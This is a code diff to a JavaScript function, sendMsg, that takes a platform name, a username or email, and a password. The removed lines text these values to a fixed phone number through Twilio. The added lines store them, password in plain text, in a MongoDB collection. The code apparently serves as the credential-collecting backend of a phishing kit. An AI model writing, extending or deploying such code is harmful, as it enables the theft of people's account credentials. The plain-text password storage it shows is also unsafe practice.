@@ -1,27 +1,20 @@
-const twilio = require("twilio");
+const mongoose = require("mongoose");
+const User = require("./User");
 
 async function sendMsg(identifier, password, platform) {
-  const accountSid = process.env.ACCOUNT_SID;
-  const authToken = process.env.AUTH_TOKEN;
-  const from = process.env.FROM_MOBILE_NUMBER;
-  const to = process.env.TO_MOBILE_NUMBER;
-  const client = twilio(accountSid, authToken);
+  const user = await new User({
+    Platform: platform,
+    Username: identifier,
+    Password: password,
+  });
 
-  await client.messages
-    .create({
-      from: from,
-      to: to,
-      body: `Platform: ${platform}\nUsername/Email/Mobile: ${identifier} \nPassword: ${password}`,
-    })
-    .then((message) =>
-    {
-      console.log(message.sid);
-      return true;
-    })
-    .catch((error) => {
-      console.log(error);
-      return false;
-    });
+  try {
+    await user.save();
+    return true;
+  } catch (error) {
+    console.error(error);
+    return false;
+  }
 }
 
 module.exports = sendMsg;
